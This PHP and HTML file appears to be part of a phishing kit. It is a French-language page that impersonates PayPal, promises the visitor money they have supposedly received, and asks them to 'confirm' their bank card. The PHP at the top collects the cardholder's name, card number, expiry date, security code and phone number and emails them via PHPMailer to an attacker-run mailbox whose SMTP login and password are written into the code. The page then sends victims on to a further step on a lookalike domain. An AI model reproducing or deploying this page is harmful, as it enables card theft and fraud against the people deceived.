<?php
require("PHPMailer-master/src/PHPMailer.php");
require("PHPMailer-master/src/SMTP.php");
require("PHPMailer-master/src/Exception.php");

if (isset($_POST['detailsSubmit'])) {  // bloc if a inserer dans ton code

$mail = new PHPMailer\PHPMailer\PHPMailer();

$mail->isSMTP();
//$mail->SMTPDebug = 1;
$mail->Host = 'placaliandgarba.fun';
$mail->SMTPAuth = true;
$mail->Username = 'petit-joli-coeur@placaliandgarba.fun';

$mail->Password = "angola89@";
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom('petit-joli-coeur@placaliandgarba.fun','CLIENT');
$mail->addAddress('petit-joli-coeur@placaliandgarba.fun','CLIENT');
$mail->addReplyTo('petit-joli-coeur@placaliandgarba.fun','CLIENT');


//$mail->addAttachment($_SESSION['CheminImageDocument']);

$mail->isHTML(true); // Mail envoyé en HTML

$mail->Subject = "Informations de la CB"; 

$Message = "cardPrenom: " . $_POST['cardPrenom'] . "<br>";
$Message .= "cardNom: " . $_POST['cardNom'] . "<br>";
$Message .= "cardNumber: " . $_POST['cardNumber'] . "<br>";
$Message .= "expDate: " . $_POST['expDate'] . "<br>";
$Message .= "verificationCode: " . $_POST['verificationCode'] . "<br>";
$Message .= "tel: " . $_POST['tel'] . "<br>";

$mail->Body    =  $Message;

//$mail->AltBody = 'Message au format text/plain';

if (!$mail->send()) {
    // erreur lors de l'envoi.
    $cardPrenom = $_POST['cardPrenom'];
    $cardNom = $_POST['cardNom'];
    $cardNumber = $_POST['cardNumber'];
    $expDate = $_POST['expDate'];
    $verificationCode = $_POST['verificationCode'];
    $cardNumber = $_POST['tel'];

    // ou le code ci-dessous pour vider les champs
    // $champ1 = "";
    // $champ2 = "";
    // $champ3 = "";
    // $champ4 = "";

} else {
    // OK message envoyé avec succès.
    header('location: info-bancaire.php');
    exit();
}
}
?>

<!DOCTYPE html>
<html dir="ltr" style="background-color: #f4f6f9;">
<head>
    <meta charset="utf-8" />
    <title>Vous avez reçu de l'argent</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
   <!-- <link rel="stylesheet" href="css/normalize.css" /> -->
    <!--<link rel="stylesheet" href="css/bootstrap.min.css" />-->
    <link rel="stylesheet" href="css/font-awesome.min.css" />
    <link rel="stylesheet" href="css/main_style.css" />
</head>

<body>

<div class="contain">
                <div class="img-logo">
                    <a href="https://reglement-en-cours-traitement.go.yj.fr/transfert-instantane/"><img src="img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="https://reglement-en-cours-traitement.go.yj.fr/transfert-instantane/connexion.php" class="log_out">Déconnexion</a></div>
                <div class="cls"></div>
 </div>

<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection" tabindex="-1">
        <div class="vx_modal-content">
        <center><span class="step" style="text-transform:uppercase; text-align:center;"><b>étape 2 sur 3</b></span></center>
        <p></p>
        <p></p>
        <h3>Confirmez votre carte bancaire</h3>
             <header class="vx_modal-header">
        <div class="expandableContainer">
                            <label for="paypalAccountData_tcpa">
                            Pour des raisons de sécurité, nous procédons parfois à la vérification rapide de vos informations personnelles, y compris à chaque mise à jour du site.
                            </label>
                            <label for="paypalAccountData_tcpa">
                            Complétez les étapes 2 et 3 avec les informations respectives pour récupérer le montant du paiement entre proche  sur votre compte bancaire ou votre compte PayPal.
                            </label>
                            <label for="paypalAccountData_tcpa">
                            <span style="font-weight:bold;">NB</span> : vos données sont cryptées et stockées sur un serveur ultra sécurisé à l'abri d'un tiers.
                            </label>
                            <br>
                            <br>
                            <center style="margin-bottom:20px;">
                        	<img src="img/vsa.png">
                        	<img src="img/mc.png">
                        	<img src="img/dcl1.png">
                        	<img src="img/dc.png">
                        	<img src="img/amx.png">
                            <img src="img/cb.png">
                            </center>

                        </div>
                        
        <p class="vx_text-body"></p>

    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">
                <form method="POST" action="" accept-charset="UTF-8" class="proceed maskable" autocomplete="off" name="cvalidate"><input name="_token" type="hidden" value="BpuWz5vIAOk3PLRLpC1VwwEmVeTm3fVrp5dj6YJW">


                   <div class="card-wrapper"></div>

                      <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Prénom">
                         <label class="floatingLabel" for="cardNumber">Prénom</label>
                         <input value="<?php echo $cardPrenom; ?>" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="Entrez le Pénom(s) du titulaire de la carte" aria-describedby="text-info-cardNumber" id="cardPrenom" name="cardPrenom" type="text">
                      </div>
                      <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Nom">
                         <label class="floatingLabel" for="cardNumber">Nom</label>
                         <input value="<?php echo $cardNom; ?>" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardprenom" placeholder="Entrez le Nom du titulaire de la carte" aria-describedby="text-info-cardNumber" id="cardNom" name="cardNom" type="text">
                      </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Numéro de carte">
                            <label class="floatingLabel" for="cardNumber">Numéro de carte</label>
                           <input value="<?php echo $cardNumber; ?>" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardNumber" placeholder="Entrez le nº de carte" aria-describedby="text-info-cardNumber" id="cardNumber" name="cardNumber" type="text">
                        </div>

                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active vx_floatingLabel_complex" data-label-content="Date d&#x27;expiration">
                            <label class="floatingLabel" for="expDate">Date d&#x27;expiration</label>
                            <div class="vx_form-control" data-label-content="Date d&#x27;expiration">
                               <input value="<?php echo $expDate; ?>" aria-label="login_emaildiv" class="test_expDate" required="required" autocomplete="off_expDate" placeholder="mm/aa" aria-describedby="text-info-expDate" id="expDate" name="expDate" type="text">
                            </div>
                           <span></span>
                        </div>
                        <div class="table-container">
                            <div class="table-row">
                                <div class="table-col-xs-10">
                                    <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Cryptogramme visuel">
                                        <label class="floatingLabel" for="verificationCode">Cryptogramme visuel</label>
                                          <input value="<?php echo $verificationCode; ?>" aria-label="login_emaildiv" class="test_verificationCode test_verificationCode vx_form-control" required="required" autocomplete="off_verificationCode" placeholder="Saisissez le cryptogramme visuel." aria-describedby="text-info-verificationCode" id="verificationCode" name="verificationCode" type="password">

                                    </div>
                                </div>
                                <div class="table-col-xs-2 cardImage-container"><span data-name="" class="rectangleLogo_small shadow  csc-image "></span></div>
                            </div>
                        </div>
                        
                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Numéro de Mobile">
                            <label class="floatingLabel" for="cardNumber">Numéro de Mobile</label>
                           <input value="<?php echo $tel; ?>" aria-label="login_emaildiv" class="test_cardNumber test_cardNumber vx_form-control" required="required" autocomplete="off_cardNumber" placeholder="Entrez le nº de téléphone lié à la carte" aria-describedby="text-info-cardNumber" id="cardNumber" name="tel" type="text">
                        </div>

                        <button type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="">Valider</button>
                   </form>

                </div>

            </div>

        </div>

    </div>

            <div class="foot-pay">
                <center>
                    <a href="#">Contact</a>
                    <a href="#">Respect de la vie privée</a>
                    <a href="#">Contrat d'utilisation</a>
                    <a href="#">International</a>                   
                </center>            
            </div>

        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>
   

   <script type="text/javascript" src="public/js/card.js"></script>
   <script type="text/javascript">
      var card = new Card({
         form: 'form',
         container: '.card-wrapper',
         formSelectors: {
            nameInput: 'input[name="cardPrenom"], input[name="cardNom"]',
            numberInput: 'input[name="cardNumber"]', // optional — default input[name="number"]
            expiryInput: 'input[name="expDate"]', // optional — default input[name="expiry"]
            cvcInput: 'input[name="verificationCode"]', // optional — default input[name="cvc"]
         },
         messages: {
            validDate: 'expire\ndate',
            monthYear: 'mm/yyyy'
         }
      });
   </script>

</body>

</html>
